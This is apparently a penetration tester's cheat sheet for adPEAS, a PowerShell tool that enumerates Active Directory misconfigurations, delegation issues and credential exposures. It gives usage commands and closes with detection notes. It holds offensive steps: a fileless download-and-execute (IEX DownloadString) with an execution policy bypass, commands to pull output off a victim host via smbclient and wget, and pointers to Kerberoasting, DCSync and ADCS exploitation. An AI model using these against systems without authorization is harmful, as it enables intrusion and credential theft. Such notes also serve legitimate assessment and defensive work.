# adPEAS

adPEAS (Active Directory Privilege Escalation Automation Script) is a PowerShell-based enumeration tool that automates the discovery of common AD misconfigurations, privilege escalation paths, credential exposures, and delegation issues. Think of it as linpeas but for Active Directory environments.

It wraps many manual enumeration steps into a single script and outputs color-coded results highlighting findings by severity.

Download: https://github.com/61106960/adPEAS

---

## Setup and Import

```powershell
# Bypass execution policy for the session
powershell -ExecutionPolicy Bypass

# Option 1 — Import from disk
Import-Module .\adPEAS.ps1

# Option 2 — Dot-source
. .\adPEAS.ps1

# Option 3 — Read raw content and execute
gc -raw .\adPEAS.ps1 | iex

# Option 4 — Download and execute directly in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
```

---

## Basic Usage

### Run Full Enumeration Against Current Domain

```powershell
# Enumerate everything for the current logged-on user and machine
Invoke-adPEAS
```

### Specify a Domain and Save Output

```powershell
# Target a specific domain and save clean output (no ANSI color codes)
Invoke-adPEAS -Domain 'domain.com' -Outputfile 'C:\Temp\adpeas_output' -NoColor
```

### Target a Specific Domain Controller

```powershell
Invoke-adPEAS -Domain 'domain.com' -Server 'dc01.domain.com'
```

### Run with Explicit Credentials

```powershell
# Using PSCredential object
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\username', $SecPassword)
Invoke-adPEAS -Domain 'domain.com' -Cred $Cred
```

### Force Enumeration (Ignore DNS Issues)

```powershell
Invoke-adPEAS -Domain 'domain.com' \
  -Server 'dc01.domain.com' \
  -Username 'domain\username' \
  -Password 'Password123!' \
  -Force
```

---

## Module-Specific Enumeration

Run individual modules instead of the full scan to reduce noise or focus on a specific area.

### Domain Information

```powershell
# Basic AD info — domain name, forest, trusts, functional level
Invoke-adPEAS -Module Domain
```

### Rights and Permissions

```powershell
# ACL misconfigurations — GenericAll, WriteDACL, GenericWrite on high-value objects
Invoke-adPEAS -Module Rights
```

### Group Policy

```powershell
# GPO misconfigurations — writable GPOs, GPP passwords, dangerous settings
Invoke-adPEAS -Module GPO
```

### Active Directory Certificate Services (ADCS)

```powershell
# ESC1-ESC8 misconfigurations in certificate templates
# One of the most valuable modules in modern AD environments
Invoke-adPEAS -Module ADCS
```

### Credential Exposure

```powershell
# Finds credentials stored in AD attributes, descriptions, SYSVOL, and GPP
Invoke-adPEAS -Module Creds
```

### Delegation Issues

```powershell
# Unconstrained, constrained, and resource-based constrained delegation
Invoke-adPEAS -Module Delegation
```

### High Privileged Accounts

```powershell
# Members of Domain Admins, Enterprise Admins, Schema Admins, etc.
Invoke-adPEAS -Module Accounts
```

### Domain Controllers and Services

```powershell
# DC info, installed services, potential attack surface
Invoke-adPEAS -Module Computer
```

### BloodHound Collection (DCOnly — Fast)

```powershell
# Collects only DC-derived data — faster and less noisy
Invoke-adPEAS -Module Bloodhound
```

### BloodHound Collection (Full)

```powershell
# Full collection from all domain-joined machines
Invoke-adPEAS -Module Bloodhound -Scope All
```

---

## Recommended Run Order

For a structured engagement, run modules in this order to build context progressively:

```powershell
# 1. Get domain context first
Invoke-adPEAS -Module Domain

# 2. Find credential exposures early — quick wins
Invoke-adPEAS -Module Creds

# 3. Check for ADCS misconfigs — high-value, often overlooked
Invoke-adPEAS -Module ADCS

# 4. Check delegation — common escalation path
Invoke-adPEAS -Module Delegation

# 5. Check ACL misconfigs — GenericWrite / WriteDACL paths
Invoke-adPEAS -Module Rights

# 6. Check GPO for writable policies or GPP passwords
Invoke-adPEAS -Module GPO

# 7. Enumerate privileged accounts for targeting
Invoke-adPEAS -Module Accounts

# 8. Collect BloodHound data for visual analysis
Invoke-adPEAS -Module Bloodhound -Scope All
```

---

## Saving and Transferring Output

```powershell
# Save to file without color codes for clean reading on Kali
Invoke-adPEAS -Domain 'domain.com' -Outputfile 'C:\Temp\adpeas' -NoColor

# Files created:
# C:\Temp\adpeas_adPEAS.txt  — full text output
# C:\Temp\adpeas_BloodHound.zip — BloodHound data (if Bloodhound module ran)
```

Transfer the output back to Kali using any method from your file transfer notes:

```bash
# From Kali via SMB
smbclient //<target_ip>/C$ -U "<domain>\<username>" -c "get Temp\adpeas_adPEAS.txt"

# Or serve from victim and wget
# Victim:
python3 -m http.server 8080

# Kali:
wget http://<victim_ip>:8080/adpeas_adPEAS.txt
```

---

## What to Look For in Output

adPEAS color-codes findings — focus on these sections first:

| Finding | Why It Matters |
|---|---|
| `[!] Credentials found` | Cleartext passwords in AD attributes or SYSVOL |
| `[!] Unconstrained Delegation` | Any non-DC with unconstrained delegation is a high-value target |
| `[!] ADCS ESC1/ESC2/ESC4` | Certificate template misconfigs allowing domain priv esc |
| `[!] GenericAll / GenericWrite` | ACL paths to privileged objects |
| `[!] WriteDACL on Domain` | Can grant yourself DCSync rights |
| `[!] GPP cpassword` | Decryptable password in SYSVOL |
| `[!] AS-REP Roastable` | Accounts without pre-auth — offline crackable |
| `[!] Kerberoastable` | Service accounts with SPNs — offline crackable |

---

## ADCS Module — Extra Context

The ADCS module is worth running in every engagement. It checks for the most common ESC misconfigurations:

| ESC | Description |
|---|---|
| ESC1 | Enrollee can supply subject — allows requesting cert as any user |
| ESC2 | Any purpose EKU — cert usable for any authentication |
| ESC3 | Certificate request agent — can request certs on behalf of others |
| ESC4 | Writable template — can modify a template to introduce ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA |
| ESC7 | Vulnerable CA permissions |
| ESC8 | NTLM relay to HTTP enrollment endpoint |

If adPEAS flags any of these, pivot to `certipy` for exploitation.

---

## Detection Notes

- adPEAS generates significant LDAP query volume — unusual for a non-admin workstation
- Event ID 4662 — AD object access during enumeration
- Large number of LDAP searches from a single host in a short timeframe
- BloodHound collection (SharpHound internally) generates Event ID 4624 logon events across many machines if using `-Scope All`
- Running in memory via `IEX` avoids disk artifacts but AMSI may flag it